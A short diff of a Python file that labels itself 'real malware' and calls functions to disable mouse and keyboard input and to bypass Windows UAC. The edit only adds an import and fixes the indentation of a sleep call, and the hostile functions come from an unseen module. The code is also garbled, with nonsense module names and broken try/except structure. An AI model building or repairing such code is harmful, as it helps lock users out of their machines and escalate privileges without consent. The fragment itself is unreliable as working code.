@@ -1,5 +1,6 @@
 # This is malware no joke real malware
 # https://codepal.ai
+import time
 
 from resource import functions, Ptime, decryption 
 from resource import encryption, key, hash, crytography_functions
@@ -10,8 +11,7 @@ def start():
     functions.disable_mouse_keyboard_windows()
     functions.UAC_bypass()
     retitem = True
-  
-  time.sleep(2)
+    time.sleep(2)
 
   except PermissionError:
     retitem = False
